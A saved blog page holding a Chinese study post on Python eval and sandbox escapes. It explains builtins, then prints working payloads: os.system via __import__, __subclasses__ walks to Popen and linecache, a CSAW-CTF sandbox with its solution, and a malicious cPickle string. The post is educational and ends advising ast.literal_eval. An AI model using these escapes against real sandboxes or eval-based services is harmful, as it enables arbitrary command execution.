
<!DOCTYPE html>

<html lang="zh-cn">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<title>python_eval_and_bypass_sandbox_study - l3m0n - 博客园</title>
<link href="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
<link href="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
<link href="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
<link href="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
<link href="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
<link href="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
<script src="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
<script src="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
</head>
<body>
<a name="top"></a>
<!--done-->
<div id="home">
<div id="header">
<div id="blogTitle">
<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/top.gif"/></div>
<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/logo.gif"/></a>
<!--done-->
<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
<h2></h2>
</div><!--end: blogTitle 博客的标题和副标题 -->
<div id="navigator">
<ul id="navList">
<li></li>
<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
<li></li>
<li></li>
<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/xml.gif"/></a></li>
</ul>
<div class="clear"></div>
<div class="blogStats">
<div id="blog_stats">
<!--done-->
随笔- 1 
文章- 65 
评论- 17 
</div>
</div><!--end: blogStats -->
</div><!--end: navigator 博客导航栏 -->
</div><!--end: header 头部 -->
<div id="main">
<div id="mainContent">
<div class="forFlow">
<div id="post_detail">
<!--done-->
<div id="topics">
<div class="post">
<h1 class="postTitle">
<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html" id="cb_post_title_url">python_eval_and_bypass_sandbox_study</a>
</h1>
<div class="clear"></div>
<div class="postBody">
<div class="cnblogs-markdown" id="cnblogs_post_body"><h3 id="builtin__与__builtins__的区别与关系-python有一个内建模块该模块会在python启动后但在没有执行python代码前会被加载到内存.即可用调用里面的函数其中python2.x中是__builtin__python3.x中更名为builtins">__builtin__与__builtins__的区别与关系<br/>
python有一个内建模块，该模块会在python启动后，但在没有执行python代码前，会被加载到内存.即可用调用里面的函数，其中python2.x中是<code>__builtin__</code>，python3.x中更名为<code>builtins</code></h3>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> __builtin__
<span class="bu">print</span> [i <span class="cf">for</span> i <span class="op">in</span> __builtin__.__dict__]</code></pre></div>
<p>输出</p>
<pre><code>['bytearray', 'IndexError', 'all', 'help', 'vars', 'SyntaxError', 'unicode', 'UnicodeDecodeError', 'memoryview', 'isinstance', 'copyright', 'NameError', 'BytesWarning', 'dict', 'input', 'oct', 'bin', 'SystemExit', 'StandardError', 'format', 'repr', 'sorted', 'False', 'RuntimeWarning', 'list', 'iter', 'reload', 'Warning', '__package__', 'round', 'dir', 'cmp', 'set', 'bytes', 'reduce', 'intern', 'issubclass', 'Ellipsis', 'EOFError', 'locals', 'BufferError', 'slice', 'FloatingPointError', 'sum', 'getattr', 'abs', 'exit', 'print', 'True', 'FutureWarning', 'ImportWarning', 'None', 'hash', 'ReferenceError', 'len', 'credits', 'frozenset', '__name__', 'ord', 'super', 'TypeError', 'license', 'KeyboardInterrupt', 'UserWarning', 'filter', 'range', 'staticmethod', 'SystemError', 'BaseException', 'pow', 'RuntimeError', 'float', 'MemoryError', 'StopIteration', 'globals', 'divmod', 'enumerate', 'apply', 'LookupError', 'open', 'quit', 'basestring', 'UnicodeError', 'zip', 'hex', 'long', 'next', 'ImportError', 'chr', 'xrange', 'type', '__doc__', 'Exception', 'tuple', 'UnicodeTranslateError', 'reversed', 'UnicodeEncodeError', 'IOError', 'hasattr', 'delattr', 'setattr', 'raw_input', 'SyntaxWarning', 'compile', 'ArithmeticError', 'str', 'property', 'GeneratorExit', 'int', '__import__', 'KeyError', 'coerce', 'PendingDeprecationWarning', 'file', 'EnvironmentError', 'unichr', 'id', 'OSError', 'DeprecationWarning', 'min', 'UnicodeWarning', 'execfile', 'any', 'complex', 'bool', 'ValueError', 'NotImplemented', 'map', 'buffer', 'max', 'object', 'TabError', 'callable', 'ZeroDivisionError', 'eval', '__debug__', 'IndentationError', 'AssertionError', 'classmethod', 'UnboundLocalError', 'NotImplementedError', 'AttributeError', 'OverflowError']</code></pre>
<p>即在python代码中我们可以直接使用这些函数，比如<code>pow</code>，现在如果想更丰富内建模块功能的话，只需要向这个dict里面添加</p>
<pre><code>import __builtin__
def print_hello():
    print "hello, world"
__builtin__.__dict__['hello'] = print_hello
print_hello()
hello()</code></pre>
<hr/>
<p><code>__builtins__</code>却在python2.x/3.x都有，它也就是内建模块一个引用，与<code>__builtin__</code>相同的是也会一开始被先于程序加载到内存<br/>
但不同的是</p>
<p>1、在主模块<code>main</code>中，<code>__builtins__</code>是对内建模块<code>__builtin__</code>本身的引用，即<code>__builtins__</code>完全等价于<code>__builtin__</code>，二者完全是一个东西，不分彼此</p>
<p>2、非主模块<code>main</code>中，<code>__builtins__</code>仅是对<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身</p>
<h3 id="eval函数">eval函数</h3>
<h5 id="简介">简介</h5>
<p>eval是将字符串str当成有效的表达式来求值并返回计算结果</p>
<p>原型：<code>eval(expression[, globals[, locals]])</code></p>
<p>globals为字典形式,locals为任何映射对象,分别是全局和局部命名空间，如果传入globals字典缺失<code>__builtins__</code>的时候，当前的全局命名空间将作为globals参数输入并且在表达式之前被解析，locals默认和globals相同，如果两个都省略掉话，表达式将在eval()调用的环境里面执行</p>
<p>所以就很容易做点什么。</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> os
<span class="bu">eval</span>(<span class="st">"os.system('ls')"</span>)</code></pre></div>
<p>如果os开始没有导入呢？我们可以通过<code>__import__('os')</code>导入os模块,与之相比的<code>exec</code>是可以直接import的,原因是它只能执行python表达式</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="bu">exec</span>(<span class="st">'import os'</span>)
<span class="bu">eval</span>(<span class="st">"__import__('os').system('whoami')"</span>)</code></pre></div>
<h5 id="eval绕过">eval绕过</h5>
<p>前面的表达式显示出,后面的两个参数是可以限制eval执行的函数,这样就感觉能在一定程度上有点安全</p>
<pre><code>&gt;&gt;&gt; eval('os.system(\'whoami\')',{'abs':abs},{'abs':abs})
Traceback (most recent call last):
  File "/Users/l3m0n/study/program/python/code_study/test3.py", line 15, in &lt;module&gt;
    eval('os.system(\'whoami\')',{'abs':abs},{'abs':abs})
  File "&lt;string&gt;", line 1, in &lt;module&gt;
NameError: name 'os' is not defined</code></pre>
<p>如果是这样的情况的话：</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python">env <span class="op">=</span> {}
env[<span class="st">"locals"</span>]   <span class="op">=</span> <span class="va">None</span>
env[<span class="st">"globals"</span>]  <span class="op">=</span> <span class="va">None</span>
env[<span class="st">"__name__"</span>] <span class="op">=</span> <span class="va">None</span>
env[<span class="st">"__file__"</span>] <span class="op">=</span> <span class="va">None</span>
env[<span class="st">"__builtins__"</span>] <span class="op">=</span> <span class="va">None</span>
 
<span class="bu">eval</span>(users_str, env)</code></pre></div>
<p>将作用域中的内置模块设置为None，但是一开始提到的builtins和builtin区别上面来看就知道了。<br/>
<code>__builtins__</code>是<code>__builtin__</code>的一个引用，在<code>__main__</code>模块下，两者是等价的，所以置空是没效果的</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python">[x <span class="cf">for</span> x <span class="op">in</span> ().__class__.__bases__[<span class="dv">0</span>].__subclasses__() <span class="cf">if</span> x.<span class="va">__name__</span> <span class="op">==</span> <span class="st">"zipimporter"</span>][<span class="dv">0</span>](<span class="st">"/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg"</span>).load_module(<span class="st">"configobj"</span>).os.system(<span class="st">"uname"</span>)</code></pre></div>
<p>因为eval无法直接加载object，所以需要前面的class和subclasses动态加载，然后再子类zipimporter对egg文件的configobj模块进行导入，并调用内置模块中的os模块来执行命令<br/>
其中的egg文件很关键，configobj中内置了os模块，所以只要符合这样的其他也可以。</p>
<p>egg构造(未成功....)</p>
<pre><code>可以下载带有setup.py的文件夹，加入
from setuptools import setup, find_packages
然后执行;
python setup.py bdist_egg</code></pre>
<p>可以看看默认object子类</p>
<pre><code>print [x.__name__ for x in ().__class__.__bases__[0].__subclasses__()]</code></pre>
<p>输出</p>
<pre><code>['type', 'weakref', 'weakcallableproxy', 'weakproxy', 'int', 'basestring', 'bytearray', 'list', 'NoneType', 'NotImplementedType', 'traceback', 'super', 'xrange', 'dict', 'set', 'slice', 'staticmethod', 'complex', 'float', 'buffer', 'long', 'frozenset', 'property', 'memoryview', 'tuple', 'enumerate', 'reversed', 'code', 'frame', 'builtin_function_or_method', 'instancemethod', 'function', 'classobj', 'dictproxy', 'generator', 'getset_descriptor', 'wrapper_descriptor', 'instance', 'ellipsis', 'member_descriptor', 'file', 'PyCapsule', 'cell', 'callable-iterator', 'iterator', 'long_info', 'float_info', 'EncodingMap', 'fieldnameiterator', 'formatteriterator', 'version_info', 'flags', 'BaseException', 'module', 'NullImporter', 'zipimporter', 'stat_result', 'statvfs_result', 'WarningMessage', 'catch_warnings', '_IterationGuard', 'WeakSet', 'Hashable', 'classmethod', 'Iterable', 'Sized', 'Container', 'Callable', '_Printer', '_Helper', 'SRE_Pattern', 'SRE_Match', 'SRE_Scanner', 'Quitter', 'IncrementalEncoder', 'IncrementalDecoder']</code></pre>
<p>这里面有很有模块，来绕过这个，比如：<br/>
会使程序退出：</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="bu">eval</span>(<span class="st">"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__</span>
<span class="st"> == 'Quitter'][0](0)()"</span>, {<span class="st">'__builtins__'</span>:<span class="va">None</span>})</code></pre></div>
<p>或者如果先导入过一些敏感模块，这可以使用popen来执行命令</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> subprocess
<span class="bu">eval</span>(<span class="st">"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Popen'][0](['ping','-c','1','127.0.0.1'])"</span>, {<span class="st">'__builtins__'</span>:<span class="va">None</span> ,<span class="st">'__builtin__'</span>:<span class="va">None</span>})</code></pre></div>
<p>例如《编写高质量代码》中的一则,就可以通过这个绕过：</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> subprocess
<span class="kw">def</span> ExpCalcBot(string):
    <span class="cf">try</span>:
        match_fun_list <span class="op">=</span> [<span class="st">'pow'</span>, <span class="st">'pi'</span>, <span class="st">'e'</span>]
        match_fun_dict <span class="op">=</span> <span class="bu">dict</span>([ (k, <span class="bu">globals</span>().get(k)) <span class="cf">for</span> k <span class="op">in</span> match_fun_list ])
        <span class="bu">print</span> <span class="st">'your answer is'</span>,<span class="bu">eval</span>(string,{<span class="st">"__builtins__"</span> : <span class="va">None</span>}, match_fun_dict)
    <span class="cf">except</span> <span class="pp">NameError</span>:
        <span class="bu">print</span> <span class="st">"The expression you enter is not valid"</span>
ExpCalcBot(<span class="st">"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Popen'][0](['ping','-c','1','127.0.0.1'])"</span>)</code></pre></div>
<h5 id="csaw-ctf-python-sandbox">CSAW-CTF Python sandbox</h5>
<pre><code>#!/usr/bin/env python 
from __future__ import print_function
 
print("Welcome to my Python sandbox! Enter commands below!")
 
banned = [  
    "import",
    "exec",
    "eval",
    "pickle",
    "os",
    "subprocess",
    "kevin sucks",
    "input",
    "banned",
    "cry sum more",
    "sys"
]
 
targets = __builtins__.__dict__.keys()  
targets.remove('raw_input')  
targets.remove('print')  
for x in targets:  
    del __builtins__.__dict__[x]
 
while 1:  
    print("&gt;&gt;&gt;", end=' ')
    data = raw_input()
 
    for no in banned:
        if no.lower() in data.lower():
            print("No bueno")
            break
    else: # this means nobreak
        exec data</code></pre>
<p>看了一下writeup，大概是通过类里面找到一个含有os的模块，也就是上面的egg构造那块</p>
<p>最后payload：</p>
<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.values()[137]('whoami')</code></pre>
<p>RickGray给出的poc(原文显示有问题,这个poc显示起来就很好理解)：</p>
<pre><code>[x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('echo Hello SandBox')</code></pre>
<h5 id="pickle.loads序列化导致命令执行问题">pickle.loads序列化导致命令执行问题</h5>
<p>研究eval随便也看了看python的序列化问题</p>
<pre><code>import cPickle
cPickle.loads("cos\nsystem\n(S'uname -a'\ntR.")</code></pre>
<pre><code>data = "test" 
#序列化
packed = cPickle.dumps(data)
#反序列化
data = cPickle.loads(packed)</code></pre>
<h3 id="总结">总结</h3>
<p>如果对象不是信任源，尽量避免使用eval，可以用安全性更好的ast.literal_eval替代</p>
<h3 id="参考资料">参考资料</h3>
<p><a class="uri" href="http://drops.wooyun.org/tips/7710">http://drops.wooyun.org/tips/7710</a></p>
<p><a class="uri" href="http://drops.wooyun.org/web/7490">http://drops.wooyun.org/web/7490</a></p>
<p><a class="uri" href="http://drops.wooyun.org/papers/66">http://drops.wooyun.org/papers/66</a></p>
<p><a class="uri" href="https://hexplo.it/escaping-the-csawctf-python-sandbox/">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a></p>
<p><a class="uri" href="http://drops.wooyun.org/web/13057">http://drops.wooyun.org/web/13057</a></p>
</div><div id="MySignature"></div>
<div class="clear"></div>
<div id="blog_post_info_block">
<div id="BlogPostCategory"></div>
<div id="EntryTag"></div>
<div id="blog_post_info">
</div>
<div class="clear"></div>
<div id="post_next_prev"></div>
</div>
</div>
<div class="postDesc">posted @ <span id="post-date">2016-05-14 22:20</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=5493722" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(5493722);return false;">收藏</a></div>
</div>
<script src="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=5493722,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/5/14 22:20:00';loadViewCount(cb_entryId);</script>
</div><!--end: topics 文章、评论容器-->
</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
<div class="commentform" id="comment_form">
<a name="commentform"></a>
<div id="divCommentShow"></div>
<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
<div id="comment_form_container"></div>
<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
<div id="ad_t2"></div>
<div id="opt_under_post"></div>
<div class="c_ad_block" id="cnblogs_c1"></div>
<div id="under_post_news"></div>
<div class="c_ad_block" id="cnblogs_c2"></div>
<div id="under_post_kb"></div>
<div class="c_ad_block" id="HistoryToday"></div>
<script type="text/javascript">
    fixPostBody();
    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
    deliverAdT2();
    deliverAdC1();
    deliverAdC2();    
    loadNewsAndKb();
    loadBlogSignature();
    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
    loadOptUnderPost();
    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
</script>
</div>
</div><!--end: forFlow -->
</div><!--end: mainContent 主体内容容器-->
<div id="sideBar">
<div id="sideBarMain">
<!--done-->
<div class="newsItem">
<h3 class="catListTitle">公告</h3>
<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
</div>
<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
<div id="leftcontentcontainer">
<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
</div>
</div><!--end: sideBarMain -->
</div><!--end: sideBar 侧边栏容器 -->
<div class="clear"></div>
<div class="clear"></div>
</div><!--end: main -->
<div class="clear"></div>
<div id="footer">
<!--done-->
Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
	</div><!--end: footer -->
</div><!--end: home 自定义的最大容器 -->
<!--PageEndHtml Block Begin-->
<div align="center" id="something">
<script language="javascript" src="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
<script language="javascript" src="./python_eval_and_bypass_sandbox_study - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
</div>
<script>
$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
window.onload=function(){
  $('#q').css({'width':'100px'});
  $('#under_post_news').html('');
  $('#under_post_kb').html('');
  $('#ad_t2').html('');
  $('#cnblogs_c1').html('');
  $('#cnblogs_c2').html('');
}
</script>
<!--PageEndHtml Block End-->
</body>
</html>
